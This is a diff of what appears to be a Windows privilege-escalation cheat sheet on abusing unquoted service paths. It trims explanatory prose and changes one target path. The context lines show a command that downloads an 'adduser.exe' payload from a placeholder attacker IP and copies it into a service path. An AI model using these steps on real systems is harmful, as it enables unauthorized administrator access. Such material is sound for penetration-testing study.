@@ -1111,8 +1111,6 @@ Restart-Service <<SERVICE_NAME>>
 
 ### Unquoted Service Paths
 
-Let's show this in an example with the unquoted service binary path **C:\Program Files\My Program\My Service\service.exe**. When Windows starts the service, it will use the following order to try to start the executable file due to the spaces in the path.
-
 ```
 C:\Program.exe
 C:\Program Files\My.exe
@@ -1142,8 +1140,6 @@ Stop-Service <<SERVICE_NAME>>
 
 #### Check permissions on the parts of the full path
 
-Since we can restart the service ourselves, we don't need to issue a reboot to restart the service. Next, let's list the paths Windows uses to attempt locating the executable file of the service.
-
 ```
 C:\Program.exe
 C:\Program Files\Enterprise.exe
@@ -1170,7 +1166,7 @@ iwr -uri http://<<IP>>/adduser.exe -Outfile Current.exe
 ```
 
 ```
-copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+copy .\Current.exe 'C:\Program Files\Enterprise\Current.exe'
 ```
 
 #### Start Service
